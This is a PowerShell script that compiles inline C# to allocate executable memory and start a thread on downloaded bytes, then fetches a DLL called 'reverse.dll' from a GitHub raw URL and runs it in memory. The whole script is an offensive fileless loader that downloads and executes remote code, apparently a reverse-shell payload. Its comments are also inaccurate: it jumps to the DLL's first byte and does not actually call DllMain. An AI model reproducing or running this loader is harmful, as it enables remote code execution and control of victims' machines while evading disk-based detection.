# Function to compile C# code and add it as a type
function Compile-CSharpCode {
    $code = @"
using System;
using System.Runtime.InteropServices;

public class MemoryLoader {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    public static void LoadDll(byte[] dllBytes) {
        // Allocate memory for the DLL
        IntPtr allocatedMemory = VirtualAlloc(IntPtr.Zero, (uint)dllBytes.Length, 0x1000 | 0x2000, 0x40);
        if (allocatedMemory == IntPtr.Zero) {
            throw new Exception("Failed to allocate memory for the DLL.");
        }

        // Copy DLL bytes to allocated memory
        Marshal.Copy(dllBytes, 0, allocatedMemory, dllBytes.Length);

        // Create a thread to execute the DLL's entry point
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, IntPtr.Zero);
        if (hThread == IntPtr.Zero) {
            VirtualFree(allocatedMemory, 0, 0x8000);
            throw new Exception("Failed to create thread for DLL execution.");
        }

        // Wait for the thread to finish executing
        WaitForSingleObject(hThread, 0xFFFFFFFF);

        // Clean up
        CloseHandle(hThread);
        VirtualFree(allocatedMemory, 0, 0x8000);
    }
}
"@

    Add-Type -TypeDefinition $code -Language CSharp
}

# Call the function to compile and add the MemoryLoader type
try {
    if (-not ([System.Reflection.Assembly]::GetType('MemoryLoader'))) {
        Write-Host "[*] Compiling and adding MemoryLoader type"
        Compile-CSharpCode
        Write-Host "[+] MemoryLoader type added successfully"
    } else {
        Write-Host "[*] MemoryLoader type already exists"
    }
} catch {
    Write-Host "[!] Error adding MemoryLoader type: $_"
}

# Function to download the DLL from a given URL
function Download-DLL {
    param (
        [string]$Url
    )
    
    try {
        # Download the DLL from the URL and return it as a byte array
        Write-Host "[*] Downloading DLL from $Url"
        $dllBytes = (New-Object System.Net.WebClient).DownloadData($Url)
        Write-Host "[+] DLL downloaded successfully"
        return $dllBytes
    } catch {
        Write-Host "[!] Failed to download DLL: $_"
        return $null
    }
}

# Function to load and execute the DLL in memory
function Invoke-DLLInMemory {
    param (
        [string]$DllUrl
    )

    # Step 1: Download the DLL from the web
    $dllBytes = Download-DLL -Url $DllUrl
    
    if (-not $dllBytes) {
        Write-Host "[!] DLL download failed. Exiting."
        return
    }

    # Step 2: Load the DLL into memory and execute it
    Write-Host "[*] Loading and executing DLL in memory"
    
    try {
        # Load the DLL into memory and call DllMain
        [MemoryLoader]::LoadDll($dllBytes)
        Write-Host "[+] DLL successfully loaded and executed in memory"
    } catch {
        Write-Host "[!] Error executing DLL in memory: $_"
    }
}

# Example usage: Replace with your DLL URL
Invoke-DLLInMemory -DllUrl "https://github.com/AlexTriumf/pst/raw/refs/heads/main/reverse.dll"
